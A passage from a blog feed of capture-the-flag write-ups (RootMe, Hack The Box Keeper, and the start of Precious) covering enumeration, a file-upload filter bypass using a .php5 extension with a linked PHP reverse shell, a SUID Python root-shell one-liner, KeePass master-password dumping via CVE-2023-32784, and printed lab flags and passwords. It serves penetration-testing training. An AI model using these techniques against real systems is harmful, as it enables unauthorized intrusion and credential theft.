<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>   <span style="color:#a6e22e">open</span>     <span style="color:#a6e22e">ssh</span>
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>   <span style="color:#a6e22e">open</span>     <span style="color:#a6e22e">http</span>
<span style="color:#ae81ff">2200</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">filtered</span> <span style="color:#a6e22e">ici</span>

<span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">done</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">IP</span> <span style="color:#a6e22e">address</span> (<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">host</span> <span style="color:#a6e22e">up</span>) <span style="color:#a6e22e">scanned</span> <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">27.19</span> <span style="color:#a6e22e">seconds</span>
</code></pre></div><p>After conducting the initial enumeration using Nmap, I discovered two open ports: port 22, typically used for Secure Shell (SSH) connections, and port 80, which is the default port for HTTP traffic. This finding suggests potential avenues for further investigation, such as examining the HTTP service for web vulnerabilities or exploring the SSH service for secure remote access possibilities.</p>
<h2 id="80---http">80 - HTTP</h2>
<p>Let&rsquo;s begin by enumerating port 80, often a primary entry point. To gather more detailed information about the target on port 80, I utilized tools like <code>Nuclei</code> and <code>Wappalyzer</code>. Nuclei is adept at identifying vulnerabilities and security-related configurations, while <code>Wappalyzer</code> helps in detecting various technologies and services running on the web server. This approach ensures a thorough examination of the web server&rsquo;s configuration, security posture, and the technologies in use, paving the way for a more informed and strategic exploration of the target system.</p>

    <img src="/images/rootme/Untitled.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/rootme/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />


<p>Having gathered initial information about the target, the next step involves enumerating interesting folders and files on the HTTP server. This process is critical in identifying potentially sensitive directories, misconfigured files, or hidden resources that could provide further insights into the server&rsquo;s structure and vulnerabilities. Tools like <code>DirBuster</code>, <code>Gobuster</code>, or <code>ffuf</code> can be employed for this purpose. They systematically scan the web server for known paths and can be configured with wordlists tailored to the server&rsquo;s profile, enhancing the chances of uncovering significant findings in the server&rsquo;s file and directory structure. This step is pivotal for a comprehensive security assessment, often revealing avenues for deeper exploitation or data extraction. I particularly like the<code>ghobuster</code>.</p>

    <img src="/images/rootme/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<p>I came across two intriguing folders named &lsquo;upload&rsquo; and &lsquo;panel&rsquo;. These directories hinted at more complex functionalities within the server&rsquo;s architecture. Notably, the &lsquo;panel&rsquo; folder contained an upload feature, which immediately piqued my interest as a potential security vector.</p>
<p>I attempted to upload a PHP file, anticipating some level of interaction or perhaps even a breakthrough. However, instead of success, I was met with an error message. This outcome, while initially seeming like a setback, actually opens up new avenues for investigation. It suggests that there are underlying controls or filters in place, which now become a focal point of my analysis. Understanding and potentially circumventing these restrictions could be key to uncovering deeper vulnerabilities within the system.</p>

    <img src="/images/rootme/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


<p>Then, I decided to employ a straightforward yet potentially effective tactic: I simply renamed the file to have a .png extension. This approach aimed to test the server&rsquo;s file validation mechanisms — to see if it merely checks file extensions superficially or delves deeper into the actual file content. Renaming a PHP file to a .png could potentially bypass basic filters that only scrutinize file extensions, allowing for further exploration of how the server handles unexpected file types under familiar extensions.</p>

    <img src="/images/rootme/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />


<p>The file goes to the <code>upload</code> page:</p>

    <img src="/images/rootme/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />


<p>In my initial attempt to exploit the discovered vulnerability, I sent a simple PHP reverse shell script. However, it didn&rsquo;t work on the first try. This led me to a phase of trial and error, experimenting with various forms of PHP shell scripts, and trying to pinpoint the reason for the failure. During this process, I realized that the issue might not be with the shell scripts themselves, but rather with the file extension.</p>
<p>Originally, I was removing the <strong><code>.php</code></strong> extension to upload the shell, which seemed like a reasonable approach given the server&rsquo;s file validation system. But then, I had an insight: What if the server was still processing PHP, but only with a different extension? Acting on this hunch, I renamed the shell to have a <strong><code>.php5</code></strong> extension. To my satisfaction, this small tweak was the key. The server accepted the file, and I successfully gained a reverse shell.</p>
<p>This breakthrough was a testament to the importance of persistence and creative thinking in penetration testing. It highlighted how even seemingly minor details, like a file extension, can be critical in security testing scenarios.</p>

    <img src="/images/rootme/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/rootme/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />


<p>I used the PHP-reverse-shell from pentestmonkey:</p>
<p><a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" >php-reverse-shell</a></p>
<p>When the usual search in common folders didn&rsquo;t yield the flag, I resorted to using the <strong><code>find</code></strong> command to search for the <strong><code>user.txt</code></strong> file. This approach is often necessary in capture the flag (CTF) challenges or penetration testing scenarios when the flag, a text file containing a specific string used for scoring or verification purposes, isn&rsquo;t located in the standard directories.</p>
<p>Executing a command like <strong><code>find / -type f -name user.txt</code></strong> allowed me to scan the entire file system for any file named <strong><code>user.txt</code></strong>. This method is thorough and ensures that no directory is overlooked, but it can be time-consuming and may require sifting through a lot of data. Nonetheless, it&rsquo;s an effective technique when the location of a target file is unknown or hidden in an unconventional location.</p>

    <img src="/images/rootme/Untitled%208.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>When searching for potential privilege escalation avenues, I turned my attention to files with SUID (Set Owner User ID upon execution) permissions. SUID is a special type of file permission given to a file. It enables users to execute the file with the permissions of the file owner, which could be the root user.</p>
<p>Noticing that Python had SUID permissions set, it immediately stood out as a promising target. Python being SUID enabled could be a significant misconfiguration, allowing for privilege escalation. In a typical Linux environment, Python with SUID permissions could be exploited to execute arbitrary commands with elevated privileges.</p>
<p>For instance, one could invoke a Python shell with elevated permissions using a command like <strong><code>/usr/bin/python -c 'import os; os.system(&quot;/bin/sh&quot;)'</code></strong>. This could potentially provide a shell with root-level access, assuming Python&rsquo;s SUID bit is set and the binary is owned by the root.</p>

    <img src="/images/rootme/Untitled%209.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/rootme/Untitled%2010.png"  class="center"  style="border-radius: 10px;"  />


<p>After running the exploit I got the shell, and the flag was in the root folder.</p>

    <img src="/images/rootme/Untitled%2011.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Keeper - Write Up</title>
            <link>https://nmmorette.github.io/posts/2023/10/hack-the-box-keeper-write-up/</link>
            <pubDate>Tue, 17 Oct 2023 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2023/10/hack-the-box-keeper-write-up/</guid>
            <description>Keeper ​12thAug 2023
Machine Author(s): knightmare
Enumeration Initial nmap scan:
nmap 10.10.11.227 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 18:52 EDT Nmap scan report for 10.10.11.227 Host is up (0.13s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 14.86 seconds sudo nmap -sS -A 10.10.11.227 -p 22,80 Starting Nmap 7.</description>
            <content type="html"><![CDATA[<h1 id="keeper">Keeper</h1>
<p>
    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/keeper/keeper.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>​12<!-- raw HTML omitted -->th<!-- raw HTML omitted --> Aug 2023</p>
<p>Machine Author(s): <strong><a href="https://app.hackthebox.com/users/8930" target="_blank" >knightmare</a></strong></p>
<h2 id="enumeration">Enumeration</h2>
<p>Initial <code>nmap</code> scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">nmap</span> <span style="color:#ae81ff">10.10.11.227</span>
<span style="color:#a6e22e">Starting</span> <span style="color:#a6e22e">Nmap</span> <span style="color:#ae81ff">7.94</span> ( <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org ) at 2023-10-17 18:52 EDT
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">scan</span> <span style="color:#a6e22e">report</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.11.227</span>
<span style="color:#a6e22e">Host</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">up</span> (<span style="color:#ae81ff">0.13</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">latency</span>).
<span style="color:#a6e22e">Not</span> <span style="color:#a6e22e">shown</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">998</span> <span style="color:#a6e22e">closed</span> <span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">ports</span> (<span style="color:#a6e22e">conn</span><span style="color:#f92672">-</span><span style="color:#a6e22e">refused</span>)
<span style="color:#a6e22e">PORT</span>   <span style="color:#a6e22e">STATE</span> <span style="color:#a6e22e">SERVICE</span>
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ssh</span>
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">http</span>

<span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">done</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">IP</span> <span style="color:#a6e22e">address</span> (<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">host</span> <span style="color:#a6e22e">up</span>) <span style="color:#a6e22e">scanned</span> <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">14.86</span> <span style="color:#a6e22e">seconds</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">nmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">sS</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">10.10.11.227</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">p</span> <span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">80</span> 
<span style="color:#a6e22e">Starting</span> <span style="color:#a6e22e">Nmap</span> <span style="color:#ae81ff">7.94</span> ( <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org ) at 2023-10-17 18:59 EDT
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">scan</span> <span style="color:#a6e22e">report</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.11.227</span>
<span style="color:#a6e22e">Host</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">up</span> (<span style="color:#ae81ff">0.15</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">latency</span>).

<span style="color:#a6e22e">PORT</span>   <span style="color:#a6e22e">STATE</span> <span style="color:#a6e22e">SERVICE</span> <span style="color:#a6e22e">VERSION</span>
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ssh</span>     <span style="color:#a6e22e">OpenSSH</span> <span style="color:#ae81ff">8.9</span><span style="color:#a6e22e">p1</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">ubuntu0</span><span style="color:#ae81ff">.3</span> (<span style="color:#a6e22e">Ubuntu</span> <span style="color:#a6e22e">Linux</span>; <span style="color:#a6e22e">protocol</span> <span style="color:#ae81ff">2.0</span>)
<span style="color:#f92672">|</span> <span style="color:#a6e22e">ssh</span><span style="color:#f92672">-</span><span style="color:#a6e22e">hostkey</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">35</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#a6e22e">d4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">40</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">f</span><span style="color:#f92672">:</span><span style="color:#ae81ff">61</span><span style="color:#f92672">:</span><span style="color:#ae81ff">86</span><span style="color:#f92672">:</span><span style="color:#a6e22e">dd</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">c</span><span style="color:#f92672">:</span><span style="color:#ae81ff">37</span><span style="color:#f92672">:</span><span style="color:#a6e22e">bb</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">98</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">e</span> (<span style="color:#a6e22e">ECDSA</span>)
<span style="color:#f92672">|</span><span style="color:#a6e22e">_</span>  <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#a6e22e">e9</span><span style="color:#f92672">:</span><span style="color:#ae81ff">72</span><span style="color:#f92672">:</span><span style="color:#a6e22e">be</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#a6e22e">b1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#a6e22e">d5</span><span style="color:#f92672">:</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">:</span><span style="color:#a6e22e">fe</span><span style="color:#f92672">:</span><span style="color:#a6e22e">dd</span><span style="color:#f92672">:</span><span style="color:#ae81ff">80</span><span style="color:#f92672">:</span><span style="color:#a6e22e">d8</span><span style="color:#f92672">:</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">:</span><span style="color:#a6e22e">c0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">66</span> (<span style="color:#a6e22e">ED25519</span>)
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">http</span>    <span style="color:#a6e22e">nginx</span> <span style="color:#ae81ff">1.18.0</span> (<span style="color:#a6e22e">Ubuntu</span>)
<span style="color:#f92672">|</span><span style="color:#a6e22e">_http</span><span style="color:#f92672">-</span><span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Site</span> <span style="color:#a6e22e">doesn</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">t</span> <span style="color:#a6e22e">have</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">title</span> (<span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span>).
<span style="color:#f92672">|</span><span style="color:#a6e22e">_http</span><span style="color:#f92672">-</span><span style="color:#a6e22e">server</span><span style="color:#f92672">-</span><span style="color:#a6e22e">header</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">nginx</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.18.0</span> (<span style="color:#a6e22e">Ubuntu</span>)
<span style="color:#a6e22e">Warning</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">OSScan</span> <span style="color:#a6e22e">results</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">unreliable</span> <span style="color:#a6e22e">because</span> <span style="color:#a6e22e">we</span> <span style="color:#a6e22e">could</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">find</span> <span style="color:#a6e22e">at</span> <span style="color:#a6e22e">least</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">and</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">closed</span> <span style="color:#a6e22e">port</span>
<span style="color:#a6e22e">Aggressive</span> <span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">guesses</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">5.0</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">4.15</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">5.8</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">5.3</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">5.4</span> (<span style="color:#ae81ff">95</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">2.6.32</span> (<span style="color:#ae81ff">95</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">5.0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">5.5</span> (<span style="color:#ae81ff">95</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">3.1</span> (<span style="color:#ae81ff">95</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">3.2</span> (<span style="color:#ae81ff">95</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">AXIS</span> <span style="color:#ae81ff">210</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">or</span> <span style="color:#ae81ff">211</span> <span style="color:#a6e22e">Network</span> <span style="color:#a6e22e">Camera</span> (<span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">2.6.17</span>) (<span style="color:#ae81ff">95</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">ASUS</span> <span style="color:#a6e22e">RT</span><span style="color:#f92672">-</span><span style="color:#a6e22e">N56U</span> <span style="color:#a6e22e">WAP</span> (<span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">3.4</span>) (<span style="color:#ae81ff">93</span><span style="color:#f92672">%</span>), <span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">3.16</span> (<span style="color:#ae81ff">93</span><span style="color:#f92672">%</span>)
<span style="color:#a6e22e">No</span> <span style="color:#a6e22e">exact</span> <span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">matches</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">host</span> (<span style="color:#a6e22e">test</span> <span style="color:#a6e22e">conditions</span> <span style="color:#a6e22e">non</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ideal</span>).
<span style="color:#a6e22e">Network</span> <span style="color:#a6e22e">Distance</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span> <span style="color:#a6e22e">hops</span>
<span style="color:#a6e22e">Service</span> <span style="color:#a6e22e">Info</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">OS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Linux</span>; <span style="color:#a6e22e">CPE</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">cpe</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">/o:linux:linux_kernel</span>

<span style="color:#a6e22e">TRACEROUTE</span> (<span style="color:#a6e22e">using</span> <span style="color:#a6e22e">port</span> <span style="color:#ae81ff">22</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>)
<span style="color:#a6e22e">HOP</span> <span style="color:#a6e22e">RTT</span>       <span style="color:#a6e22e">ADDRESS</span>
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">129.80</span> <span style="color:#a6e22e">ms</span> <span style="color:#ae81ff">10.10.14.1</span>
<span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">129.88</span> <span style="color:#a6e22e">ms</span> <span style="color:#ae81ff">10.10.11.227</span>

<span style="color:#a6e22e">OS</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">Service</span> <span style="color:#a6e22e">detection</span> <span style="color:#a6e22e">performed</span>. <span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">report</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">incorrect</span> <span style="color:#a6e22e">results</span> <span style="color:#a6e22e">at</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">done</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">IP</span> <span style="color:#a6e22e">address</span> (<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">host</span> <span style="color:#a6e22e">up</span>) <span style="color:#a6e22e">scanned</span> <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">19.75</span> <span style="color:#a6e22e">seconds</span>
</code></pre></div><h3 id="80---http">80 - http</h3>
<p><img src="/images/keeper/Untitled.png" alt="Untitled"></p>
<p>Add DNS entries for keeper.htb and tickets.keeper.htb in <code>/etc/hosts</code></p>
<p><img src="/images/keeper/Untitled%201.png" alt="Untitled"></p>
<p>Enumerating Web Page Technologies:</p>
<p><img src="/images/keeper/Untitled%202.png" alt="Untitled"></p>
<p>The page is running a Request Tracker service. <strong>Request Tracker</strong> is an open-source issue tracking and workflow platform developed and supported by Best Practical Solutions.</p>
<p>Searching for Default Credentials on Google:</p>
<p><img src="/images/keeper/Untitled%203.png" alt="Untitled"></p>
<p><img src="/images/keeper/Untitled%204.png" alt="Untitled"></p>
<p>Upon further inspection of the panel, I discovered an open user ticket.</p>
<p><img src="/images/keeper/Untitled%205.png" alt="Untitled"></p>
<p>User Information Discovery:</p>
<p><img src="/images/keeper/Untitled%206.png" alt="Untitled"></p>
<p>After opening the user &ldquo;lnogaard&rdquo;, I discovered a password in the &ldquo;Extra Info&rdquo; field.</p>
<p><img src="/images/keeper/Untitled%207.png" alt="Untitled"></p>
<p>🔑 Welcome2023!</p>
<h2 id="initial-access">Initial Access</h2>
<p>Utilizing the obtained user credentials, I attempted to log in via SSH.</p>
<p><img src="/images/keeper/Untitled%208.png" alt="Untitled"></p>
<p>User flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">bb9b69aa04c524f7d2858cbfdb47e0a8</span>

</code></pre></div><h2 id="privilege-scalation">Privilege Scalation</h2>
<p>I found some files in the home folder:</p>
<p><img src="/images/keeper/Untitled%209.png" alt="Untitled"></p>
<p>I recognized that the .kdbx is a KeePass database file. Consequently, I transferred it to my local machine using <code>scp</code></p>
<p><img src="/images/keeper/Untitled%2010.png" alt="Untitled"></p>
<p>I attempted to crack the password using John the Ripper.</p>
<p>But it took too long, so I decided to explore another approach.</p>
<p><img src="/images/keeper/Untitled%2011.png" alt="Untitled"></p>
<p>While searching on Google for KeePass vulnerabilities, I came across <strong>CVE-2023-32784</strong>, which allows for dumping the master password from Keepass .dmp files.</p>
<p><a href="https://github.com/CMEPW/keepass-dump-masterkey" target="_blank" >https://github.com/CMEPW/keepass-dump-masterkey</a></p>
<p><img src="/images/keeper/Untitled%2012.png" alt="Untitled"></p>
<p>I couldn&rsquo;t dump the entire password; some characters were missing. But a quick search on Google revealed the reason for the error: the password contains special characters.</p>
<p><img src="/images/keeper/Untitled%2013.png" alt="Untitled"></p>
<p>I downloaded KeePass and opened the <code>.kdbx</code> file with the password <code>rødgrød med fløde</code></p>
<p><img src="/images/keeper/Untitled%2014.png" alt="Untitled"></p>
<p>I found a PuTTY key in the root entry.</p>
<p>Since PuTTY&rsquo;s default format is .ppk, I&rsquo;ll extract the content from the note and save it to a new file with the .ppk extension.</p>
<p><img src="/images/keeper/Untitled%2015.png" alt="Untitled"></p>
<p>Convert the .ppk to .pem using <code>puttygen</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">puttygen</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">ppk</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">O</span> <span style="color:#66d9ef">private</span><span style="color:#f92672">-</span><span style="color:#a6e22e">openssh</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">o</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">pem</span>
</code></pre></div><p>So, all that&rsquo;s left is to connect via SSH as the root user and retrieve the flag.</p>
<p><img src="/images/keeper/Untitled%2016.png" alt="Untitled"></p>
<p>Root Flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">ec5d3ab0f1d51b1455da8eaf815eaca6</span>
</code></pre></div><p><img src="/images/keeper/Untitled%2017.png" alt="Untitled"></p>
]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Precious - Write Up</title>
            <link>https://nmmorette.github.io/posts/2023/03/hack-the-box-precious-write-up/</link>
            <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2023/03/hack-the-box-precious-write-up/</guid>
            <description>Enumeration Initial scan using nmap:
sudo nmap -sS -A 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 20:20 -03 Nmap scan report for precious.htb (10.10.11.189) Host is up (0.24s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.</description>
            <content type="html"><![CDATA[<p>
    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/precious/precious.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="enumeration">Enumeration</h2>
<p>Initial scan using nmap:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>A <span style="color:#ae81ff">10.10.11.189</span>
Starting Nmap <span style="color:#ae81ff">7.93</span> ( https:<span style="color:#75715e">//nmap.org ) at 2023-03-21 20:20 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> precious.htb (<span style="color:#ae81ff">10.10.11.189</span>)
Host is up (<span style="color:#ae81ff">0.24</span>s latency).
Not shown: <span style="color:#ae81ff">998</span> closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh     OpenSSH <span style="color:#ae81ff">8.4</span>p1 Debian <span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>deb11u1 (protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#f92672">|</span> ssh<span style="color:#f92672">-</span>hostkey: 
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">3072</span> <span style="color:#ae81ff">845e13</span>a8e31e20661d235550f63047d2 (RSA)
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
<span style="color:#f92672">|</span>_  <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">33053</span>dcd7ab798458239e7ae3c91a658 (ED25519)
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http    nginx <span style="color:#ae81ff">1.18.0</span>
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Convert Web Page to PDF
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: 
<span style="color:#f92672">|</span>   nginx<span style="color:#f92672">/</span><span style="color:#ae81ff">1.18.0</span>
<span style="color:#f92672">|</span>_  nginx<span style="color:#f92672">/</span><span style="color:#ae81ff">1.18.0</span> <span style="color:#f92672">+</span> Phusion Passenger(R) <span style="color:#ae81ff">6.0.15</span>
</code></pre></div><p>Just port 80and 22open.</p>
<h3 id="http---80">HTTP - 80</h3>
<p>The initial step involved setting up the DNS entry for precious.htb, allowing me to access the address through my browser.</p>

    <img src="/images/htb/precious/http.png"  class="center"  style="border-radius: 10px;"  />


<p>I executed whatweb for web enumeration:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">whatweb http:<span style="color:#75715e">//precious.htb/
</span><span style="color:#75715e"></span>http:<span style="color:#75715e">//precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
